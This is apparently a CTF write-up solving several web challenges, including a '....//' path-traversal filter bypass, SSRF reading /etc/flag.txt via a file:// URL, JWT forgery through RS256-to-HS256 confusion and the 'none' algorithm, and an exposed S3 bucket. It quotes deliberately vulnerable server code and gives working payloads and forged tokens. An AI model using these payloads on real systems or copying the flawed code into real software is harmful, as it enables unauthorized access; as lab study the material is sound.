# Web




# The basics of web

## The challenge

Let's get started with the most simple kind of challenge: a website, and there is a flag hidden in it.

Find it!

http://13.251.87.147:5000/


## Writeup

Just reading the source code:  axactf{f1rst_pl4c3_t0_l00k_a7_1n_4_c7f}




# The basics of web, 2nd Edition


## The challenge

So know, you probably start to understand what you'll be doing, where to look .... By the way, there are specific information on a website that are not intended to be used by Humans.... Where are those?

http://13.251.87.147:5000/

## Writeup

Nothing it any files neither in request.
"specific information on a website that are not intended to be used by Humans" means for index robot:

http://13.251.87.147:5000/robots.txt

and got : 
User-agent: *
Disallow: /the/hid/den/path/to/a/new/flag

http://13.251.87.147:5000/the/hid/den/path/to/a/new/flag
and got : axactf{r0b0ts_4r3_w4y_b3773r_7h4n_p30pl3}




# Read files

## The challenge

So, this is a program to read files, but only in 1 directory. The flag.txt is in the parent directory of the one I can read. How can I read it?

http://13.251.87.147:5001/

```javascript
app.post('/get_file', (req,res) => {
  // Remove ../ in filename to avoid local file inclusion
  file = req.body.filename.replace(/\.\.\//g, '');
  if (fs.existsSync(path.join(__dirname, 'files', file))) {
    res.sendFile(path.join(__dirname, 'files', file));
  } else {
    res.render('error');
  }
});
```

# Writeup

We can see a input to read file and need to get the ../flag.txt but the code remove ../ by regex.
The trick is to do it with ....//flag.txt. By removing ../ it become ../flag.txt.

axactf{pl4y1ng_w17h_f1l35_15_d4ng3rou5}



# Super Secure Retriever Field

## The challenge

This webhook lets you check the response of an API call.

The flag is located at /etc/flag.txt

http://54.151.148.13:5001/

## Writeup

All is describe in the page. It's a SSRF vuln.
It seems to execute a url an show the answer.
Using the URL : file:////etc/flag.txt

we get : axactf{w3lcom3_t0_th3_jungl3}



# Just Web Token

## The challenge

Using public/private key to sign my JWT should ensure that no one can crack it, right?

http://52.74.85.143:5001/

```javascript
app.get('/key.pem', (req, res) => {
  res.send(fs.readFileSync('key.pem'));
});

app.get('/get_token', (req, res) => {
  res.send(jwtSimple.encode({auth: 'user'}, fs.readFileSync('key'), 'RS256'));
})

app.get('/verify_token', (req, res) => {
  const token = req.query.token;
  try {
    const decoded = jwtSimple.decode(token, fs.readFileSync('key.pem'));
    
    if (decoded.auth == 'user') {
      res.send(decoded);
    }
    if (decoded.auth == 'admin') {
      res.send(`Well done: ${process.env.FLAG}`);
    }
  } catch (e) {
    console.log(e);
    res.send('Error');
  }
});
{
  "name": "JWT3",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "start": "node index.js",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "dependencies": {
    "dotenv": "^8.0.0",
    "express": "^4.16.4",
    "jwt-simple": "0.5.1"
  }
}
```


## Writeup

So we need to hack the JWT. 
A quick look on goole/qwant on the "jwt-simple": "0.5.1" dependency lead us to the signature bypass flaw:
https://snyk.io/vuln/npm:jwt-simple

so we crafted the jwt as an admin changing the signature algo for a symetric one:


wget http://52.74.85.143:5001/key.pem

then :
```javascript
jwtSimple.encode({auth: 'admin'}, fs.readFileSync('key.pem'), 'HS256')
```

we got the token : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiYWRtaW4ifQ.FcjqpkmsS9ebil24I2DZenMttB_q7d51mBy9tDKxiXs

then : http://52.74.85.143:5001/verify_token?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiYWRtaW4ifQ.FcjqpkmsS9ebil24I2DZenMttB_q7d51mBy9tDKxiXs

and got : axactf{JW7_c4n_b3_h4ck3d_1n_s0_m4ny_w4y5}





# Just Working Terrible

## The challenge

So i found a way to protect access to the flag. Basically, if I use a JWT token to identify user types, i should be able to know who is user and who is admin.

http://52.74.85.143:5000/

```javascript
let secrets = [];

app.use((req, res, next) => {
	let cookie = req.cookies ? req.cookies.session : "";
	res.locals.flag = false;
	try {
		let sid = JSON.parse(Buffer.from(cookie.split(".")[1], 'base64').toString()).secretid;
		if (sid==undefined || sid>=secrets.length || sid<0) {
			throw "invalid sid";
		}
		let decoded = jwt.verify(cookie, secrets[sid]);
		if (decoded.perms == "admin") {
			res.locals.flag = true;
		}
		if (decoded.rolled == "yes") {
			res.locals.rolled = true;
		}
		if (res.locals.rolled) {
			req.cookies.session = ""; // generate new cookie
		}
	} catch (err) {
		req.cookies.session = "";
	}
	if (!req.cookies.session) {
		let secret = crypto.randomBytes(32);
		cookie = jwt.sign({
			perms: "user",
			secretid: secrets.length,
			rolled: res.locals.rolled ? "yes" : "no"
		}, secret, { algorithm: "HS256" });
		secrets.push(secret);
		res.cookie('session',cookie,{
			maxAge: 1000*60*10, 
			httpOnly: true
		});
		req.cookies.session = cookie;
		res.locals.flag = false;
	}
	next();
});
```


## Writeup

I didn't managed to end this challenge. A friend gave me a tip after the end of the CTF.

First we can see that this is again a JWT forgery challenge. 
We quicly understand that we need to craft a jwt with a admin perms. 
To test, I used this code :
```javascript
    let secrets = [];
    secrets.push(crypto.randomBytes(32)); //fill it a bit
    secrets.push(crypto.randomBytes(32)); //fill it a bit

    let cookie = jwt.sign({
        perms: "admin", //the goal is to be admin
        secretid: 0, //we can change it
        rolled: "no"
      }, crypto.randomBytes(32), { algorithm: "HS256"  });

    //first contol
    let sid = JSON.parse(Buffer.from(cookie.split(".")[1], 'base64').toString()).secretid;
		if (sid==undefined || sid>=secrets.length || sid<0) {
			console.log('KO sid');
    }

    //second control
    try
    {
      let decoded = jwt.verify(cookie, secrets[sid]);
      if (decoded.perms == "admin") {
        console.log('WIN');
      }
    }catch (err) {
		  	console.log('KO: decoded');
	  }

```

The challenge is to pass the jwt.verify(cookie, secrets[sid]);
We can see there is no algorithm, so it will take the one from the JWT. So we can set it to none because we don't have acces to the secrets array:
```javascript
let cookie = jwt.sign({
        perms: "admin", //the goal is to be admin
        secretid: 0, //we can change it
        rolled: "no"
      }, crypto.randomBytes(32), { algorithm: "none"  });
```

If we try it we have an error : "jwt signature is required" . Searching it in the jsonwebtoken source code: 
```javascript
    if (!hasSignature && secretOrPublicKey){
      return done(new JsonWebTokenError('jwt signature is required'));
    }
```
So we need a falsish *secrets[sid]*.
So we need to bypass the first control : if (sid==undefined || sid>=secrets.length || sid<0) {
This control considers sid as an integer. But JWT is a json file so we can bypass it by setting a string.

```javascript
let cookie = jwt.sign({
        perms: "admin", //the goal is to be admin
        secretid: "a", //we can change it
        rolled: "no"
      }, crypto.randomBytes(32), { algorithm: "none"  });
```
It is a  WIN !

The cookie to set : 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJwZXJtcyI6ImFkbWluIiwic2VjcmV0aWQiOiJhIiwicm9sbGVkIjoibm8iLCJpYXQiOjE2MDYxNDAyMTl9.'



# Super Secret Storage

## The challenge

I uploaded a flag in my Super Secret Storage. Will you find it? I bet you won't ... Even the Police won't be able to find it!

Super Secret Storage : http://somuchfuninthebucket.s3-website-ap-southeast-1.amazonaws.com/

## Writeup

The site url is http://somuchfuninthebucket.s3-website-ap-southeast-1.amazonaws.com/
thats means it's on S3.
So going directly to the bucket:

http://somuchfuninthebucket.s3.ap-southeast-1.amazonaws.com/

we can see the content : youfoundme-bchwye7u82739ru0hf:

http://somuchfuninthebucket.s3.ap-southeast-1.amazonaws.com/youfoundme-bchwye7u82739ru0hf

and got :axactf{s3_p0l1c13s_4r3_s0_much_fun}